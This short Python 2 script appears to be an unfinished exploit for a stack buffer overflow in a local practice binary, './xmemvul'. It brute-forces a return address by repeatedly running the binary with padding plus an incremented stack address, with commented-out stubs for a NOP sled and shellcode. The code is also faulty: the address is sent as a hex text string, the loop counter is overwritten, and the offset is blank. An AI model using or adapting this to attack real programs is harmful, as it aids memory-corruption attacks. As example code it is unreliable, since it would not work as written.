#!/usr/bin/python
import os
import time
from struct import *
import sys
import subprocess

varhex = "0x7ffffffe6700"
nops = 'A'*23

#offset_till_RIP = 

def load_process(varhex):
	arg = subprocess.Popen(["./xmemvul" , nops + varhex],stdout=subprocess.PIPE)
	#arg = subprocess.Popen(["ls" , "-a" + "l" ],stdout=subprocess.PIPE)
#	arg.communicate()
	#p.wait()
	out = arg.stdout.read()
	print out
	#if arg.returncode == -11:
#		print "Segmentation Fault (code dumped)"
#	elif arg.returncode == -4:
#		print "Illegal Instructions"
#	elif arg.returncode == 0:
#		print "Program Exitted Correctly"
#	else:
#		print "No idea", arg.returncode
	arg.wait()

def pop_return_address(varhex):
	for i in range(0, 100000):
		i = int(varhex, 16)
		i += 1
		varhex = hex(i)
		print hex(i)
		load_process(varhex)
		time.sleep(1)

#for i in range(0, 100000):
#	address = pop_return_address(varhex, i)
#	print address

#def export_shellcode():
#	xcode = pop_return_address


#def calculate_offset():
	

#buffer += ''
#nop_sled += 'x90'*offset_till_RIP

#print separate_hex(varhex)
pop_return_address(varhex)

